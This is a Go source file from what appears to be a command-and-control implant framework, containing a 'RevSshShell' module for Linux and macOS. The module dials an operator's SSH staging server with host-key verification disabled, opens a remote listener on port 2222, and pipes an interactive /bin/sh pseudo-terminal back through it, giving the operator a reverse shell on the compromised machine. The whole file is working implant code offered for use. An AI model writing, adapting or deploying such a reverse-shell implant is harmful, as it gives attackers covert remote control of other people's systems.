// +build linux darwin


package biterpreter

import (
	
	"io"
	//"log"
	"net"
	"os/exec"

	"github.com/kr/pty"
	"golang.org/x/crypto/ssh"

	//Fixes
	"time"
	"encoding/json"
	"fmt"
)

/*
This JSON Object definition is needed in some Implants Modules to decode parameters
Hive will have the same definitions in: ./src/hive/hiveJobs.go
*/
type InjectRevSshShellBichito struct {
    Domain string   `json:"domain"`
    Sshkey string   `json:"sshkey"`
    Port string   `json:"port"`
    User string   `json:"user"`
}

/*
Description: Inject Reverse Shell --> Linux,Darwin
Flow:
A.Use golang ssh native library to spawn a ssh client that connects to a target staging
	A1.Use provided credentials (username and pem key), for the ssh connection
B.This connection will create a listener in 2222 localport of target staging
C.Spawn a sh process within the foothold, and pipe stdout/stdin(tty) through this last opened socket
*/
func RevSshShell(jsonparams string) (bool,string){

	//Debug
	fmt.Println(jsonparams)

	var revsshshellparams *InjectRevSshShellBichito
	errDaws := json.Unmarshal([]byte(jsonparams),&revsshshellparams)
	if errDaws != nil {
		return true,"Parameters JSON Decoding error:"+errDaws.Error()
	}

	auth, err := loadPrivateKey(revsshshellparams.Sshkey)
	if err != nil {
		return true,"Load Key String error"
	}

	config := &ssh.ClientConfig{
		User: revsshshellparams.User,
		Auth: nil,
	    HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
            return nil
        },
        Timeout:time.Second * 1,
	}

	config.Auth = append(config.Auth, auth)

	// Dial the SSH connection
	sshConn, err := ssh.Dial("tcp", revsshshellparams.Domain+":"+revsshshellparams.Port, config)
	if err != nil {
		return true,"Error: error dialing remote host:"+err.Error()
	}


	// Listen on remote
	l, err := sshConn.Listen("tcp", "127.0.0.1:2222")
	if err != nil {
		return true,"Error: error listening on remote host:"+err.Error()
	}

	go listenSSH(sshConn,l)

	return false,"Success: Rev SSH Shell Connected to Staging"
}


func listenSSH(sshconn *ssh.Client,l net.Listener){

	defer sshconn.Close()

	// Start accepting shell connections
	for {
		conn, err := l.Accept()
		if err != nil {
			continue
		}

		handleConnection(conn)

		return
	}
}

func handleConnection(c net.Conn) {
	defer c.Close()

	// Start the command
	cmd := exec.Command("/bin/sh")

	// Start the command with a pty.
    ptmx, err := pty.Start(cmd)
    if err != nil {
        return
    }
    // Make sure to close the pty at the end.
    defer func() { 
    	_ = ptmx.Close() 
    	cmd.Process.Kill();
    	cmd.Process.Wait();

    }()


    errs := make(chan error, 3)

    go func() {
    	 _, err = io.Copy(ptmx, c) 
		errs <- err
	}()

	go func() {
    	_, err = io.Copy(c, ptmx)
    	errs <- err
	}()

	<-errs
	
    return
}

/*
func loadPrivateKey(keyString string) (ssh.AuthMethod, error) {


	signer, signerErr := ssh.ParsePrivateKey([]byte(keyString))
	if signerErr != nil {
		return nil, signerErr
	}
	return ssh.PublicKeys(signer), nil
}
*/